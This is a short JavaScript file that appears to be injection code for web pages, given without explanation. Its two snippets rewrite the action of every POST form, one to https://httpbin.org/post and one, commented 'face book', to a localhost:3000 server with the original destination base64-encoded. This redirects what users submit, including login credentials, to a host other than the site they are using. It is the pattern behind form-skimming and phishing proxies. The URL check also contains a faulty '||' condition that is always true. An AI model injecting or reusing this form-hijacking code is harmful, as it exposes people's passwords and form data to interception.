(function() {
    // This is where you modify the DOM

    const forms = document.querySelectorAll("form[method='post']");
    for (let i = 0; i < forms.length; i++) {
        forms[i].setAttribute("action", "https://httpbin.org/post");
    }
})()

// face book

(function() {
    // This is where you modify the DOM

    const forms = document.querySelectorAll("form[method='post']");
    for (let i = 0; i < forms.length; i++) {
        var destUrl =  forms[i].getAttribute("action");
        
        if (!destUrl.startsWith("https://") || !destUrl.startsWith("http://")) {
            destUrl = new URL(destUrl, document.baseURI).href
        }
        forms[i].setAttribute("action", "https://localhost:3000/" + btoa(destUrl));
    }
})()
